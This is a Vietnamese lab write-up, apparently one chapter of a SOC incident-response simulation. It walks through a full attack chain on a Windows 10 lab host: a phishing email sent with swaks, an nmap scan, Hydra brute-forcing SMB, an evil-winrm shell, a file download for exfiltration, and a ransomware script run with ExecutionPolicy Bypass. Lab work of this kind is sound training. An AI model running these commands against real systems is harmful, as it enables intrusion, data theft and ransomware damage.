---
title: 'End-to-End Incident Response Simulation: From Detection to Recovery'
label: 'CHƯƠNG 4: MÔ PHỎNG TẤN CÔNG'
slug: 4mo-phong-tan-cong-attack-phase
description: >-
  Dự án mô phỏng quy trình SOC khép kín: Từ Monitor, Detection đến Digital
  forensics và Recovery kết hợp Mini-SOAR Engine bằng Python theo kiến trúc bảo
  mật 6 lớp giúp tự động hóa toàn bộ quy trình.
visibility: PUBLIC
---
# CHƯƠNG 4: MÔ PHỎNG CHIẾN DỊCH TẤN CÔNG

Trong phần này, chúng ta đóng vai trò attacker sử dụng Kali Linux để thực hiện chuỗi tấn công Cyber Kill Chain toàn diện vào máy trạm Windows 10 mục tiêu.

**Quy trình tấn công bao gồm:**

* Initial Access -> Reconnaissance -> Credential Access -> Lateral Movement -> Data Exfiltration -> Ransomware.

## GIAI ĐOẠN 1: INITIAL ACCESS & RECONNAISSANCE

* **Mục tiêu:** Sử dụng kỹ thuật Social Engineering để dẫn dụ nạn nhân truy cập liên kết độc hại, từ đó thu thập thông tin định danh.

  ### 1.1. Thiết lập Hạ tầng Giả lập

  Tại máy tấn công (Kali Linux - 10.10.10.130), chúng ta khởi tạo các dịch vụ để bẫy người dùng:

  > **Technical Note :**
  >
  > Trong bài Lab này, tôi sử dụng phương pháp thu thập IP qua Web Server để mô phỏng bước **Initial Access**.
  >
  > * **Trong thực tế:** Đây đại diện cho các cuộc tấn công **Spear Phishing** tinh vi, nơi kẻ tấn công đính kèm tệp tin chứa mã độc (Malicious Attachments như Word Macro, PDF Exploit) hoặc các đường dẫn tải xuống Payload (Drive-by Download) nhằm chiếm quyền điều khiển máy trạm (RCE) ngay khi người dùng tương tác, chứ không chỉ dừng lại ở việc thu thập IP.

  **Thực thi lệnh:**

  Bash

  ```plaintext
  # 1. Khởi động MailHog (Giả lập Mail Server/SMTP)
  docker run -d -p 1025:1025 -p 8025:8025 mailhog/mailhog

  # 2. Dựng Web Server tại thư mục chứa payload (Giả lập Malicious Landing Page)
  python3 -m http.server 8080
  ```

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950047396/8c742183-2352-4852-9471-cf10a6ac539d.png" alt="" align="left" fullwidth="true" />

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764949980829/bf3280f0-3901-4fa9-aea0-832accf1bb04.png" alt="" align="left" fullwidth="true" />

  ### 1.2. Thực hiện Phishing

  Sử dụng công cụ swaks để giả mạo email từ bộ phận IT, tạo tính cấp thiết yêu cầu nhân viên click vào liên kết.

  Bash

  ```plaintext
  swaks --server 127.0.0.1:1025 \
    --from "it-support@corp.local" \
    --to "victim@lab.local" \
    --header "Subject: Yêu cầu cập nhật bảo mật khẩn cấp" \
    --body "Hệ thống phát hiện rủi ro. Vui lòng truy cập: http://10.10.10.130:8080/ để xác thực."
  ```

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950118529/c4269a17-868d-4c43-9529-10c780279d40.png" alt="" align="left" fullwidth="true" />

  ### 1.3. Thu thập Digital Footprint

  Khi nạn nhân truy cập liên kết, Web Server ghi nhận Request.

  * **Kết quả:** Thu thập thành công IP mục tiêu là 10.10.10.129. Đây là tiền đề cho các bước dò quét sâu hơn.

  ## GIAI ĐOẠN 2: SCANNING & ENUMERATION

  **Mục tiêu:** Xác định Hệ điều hành và bề mặt tấn công thông qua các cổng dịch vụ mở.

  Sử dụng Nmap để thực hiện quét tích cực:

  Bash

  ```plaintext
  # Quét Port, Service Version và OS Detection
  nmap -sS -sV -O 10.10.10.129
  ```

  **Phân tích kết quả trinh sát:**

  Dựa trên output của Nmap, ta xác định được các vector tấn công tiềm năng:

  * **OS:** Windows 10 Enterprise.

  * **Port 445 (SMB):** Open → Tiềm năng cho tấn công Brute-force hoặc khai thác lỗ hổng SMB.

  * **Port 5985 (WinRM):** Open → Cho phép quản trị từ xa như PowerShell Remoting. Đây là Primary Target để thực hiện kỹ thuật "Fileless Attack".

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950283959/d31728e6-5272-4ac7-a2f5-9e63a9d15a42.png" alt="" align="left" fullwidth="true" />

  ## GIAI ĐOẠN 3: CREDENTIAL ACCESS

  **Mục tiêu:** Bẻ khóa tài khoản người dùng hợp lệ để leo thang truy cập.

  Phát hiện dịch vụ SMB/WinRM mở nhưng không có thông tin đăng nhập, kẻ tấn công sử dụng Hydra để thực hiện tấn công vét cạn (Brute-force) dựa trên danh sách mật khẩu yếu thường gặp.

  **Thực thi tấn công:**

  Bash

  ```plaintext
  # Tấn công Brute Force vào giao thức SMB
  hydra -L user.txt -P pass.txt smb://10.10.10.129
  ```

  * **Kết quả:** Tìm được thông tin xác thực: Username: thanh / Password: thanh.

  * **Nhận định:** Việc sử dụng mật khẩu yếu và trùng tên người dùng là lỗ hổng phổ biến trong các doanh nghiệp SMB.

    <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950355273/53d68c47-8cee-4c61-b779-9f628cb950f4.png" alt="" align="left" fullwidth="true" />

    **Link file thực hiện :** Bao gồm 2 file tự cấu hình là user.txt và pass.txt là [user.txt](https://github.com/BuiNhatThanh2091/LAB0-END-TO-END-INCIDENT-RESPONSE-SIMULATION/blob/main/user.txt) && [pass.txt](https://github.com/BuiNhatThanh2091/LAB0-END-TO-END-INCIDENT-RESPONSE-SIMULATION/blob/main/pass.txt)

  ## GIAI ĐOẠN 4: LATERAL MOVEMENT & EXPLOITATION

  **Mục tiêu:** Thiết lập phiên điều khiển từ xa và duy trì kết nối.

  Sử dụng công cụ Evil-WinRM. Đây là kỹ thuật **"Living-off-the-Land" (LotL)** điển hình, lợi dụng chính công cụ quản trị của Microsoft để né tránh sự phát hiện của Antivirus truyền thống.

  Bash

  ```plaintext
  # Thiết lập kết nối WinRM Shell
  evil-winrm -i 10.10.10.129 -u thanh -p 'thanh'
  ```

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950458142/fdb6d16f-2266-4cb9-a923-7a35256549a7.png" alt="" align="left" fullwidth="true" />

  ## GIAI ĐOẠN 5: ACTION ON OBJECTIVES

  **Mục tiêu:** Đánh cắp dữ liệu nhạy cảm và triển khai mã độc tống tiền.

  ### 5.1. Internal Discovery

  Tại giao diện Shell của Evil-WinRM, kẻ tấn công thực hiện các lệnh Windows native để lục lọi hệ thống:

  PowerShell

  ```plaintext
  whoami              # Kiểm tra quyền hạn hiện tại
  ls                  # Liệt kê tệp tin
  cat secret.txt      # Đọc nội dung tệp tin khả nghi
  cd "C:\Program Files\" # Di chuyển đến thư mục chứa dữ liệu quan trọng
  ```

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950592168/b06c0ab3-49a5-4cb0-b13f-bedc5afc957e.png" alt="" align="left" fullwidth="true" />

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950510742/aa744554-013d-44e1-bbdb-3d51c3c9289b.png" alt="" align="left" fullwidth="true" />

  ### 5.2. Data Exfiltration

  Trước khi mã hóa, kẻ tấn công âm thầm sao chép dữ liệu ra ngoài để tống tiền kép.

  PowerShell

  ```plaintext
  # Sử dụng tính năng download của Evil-WinRM
  download "data_important.txt"
  ```

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950619047/787a5694-e540-45fb-9985-141f93bf1f1e.png" alt="" align="left" fullwidth="true" />

  ### 5.3. Ransomware Deployment

  Kẻ tấn công tải lên script mô phỏng Ransomware và kích hoạt quá trình mã hóa.

  PowerShell

  ```plaintext
  # 1. Upload script mã độc từ Kali lên Win10
  upload encrypt.ps1 encrypt.ps1

  # 2. Thực thi script (Bypass Execution Policy để chạy script không ký số)
  powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
  ```

  **Kết quả tác động:**

  * File data\_important.txt gốc bị ghi đè hoặc xóa bỏ.

  * Dữ liệu bị mã hóa theo chuẩn AES-256.

  * Hệ thống thông tin của nạn nhân bị gián đoạn tính sẵn sàng, hoàn tất kịch bản tấn công.

  <Image src="https://cdn.hashnode.com/res/hashnode/image/upload/v1764950668241/fac2e4b4-df11-4871-aefe-0321bb06f631.png" alt="" align="left" fullwidth="true" />

  Script Ransomware (encrypt.ps1): [encrypt.ps1](https://github.com/BuiNhatThanh2091/LAB0-END-TO-END-INCIDENT-RESPONSE-SIMULATION/blob/main/encrypt.ps1)
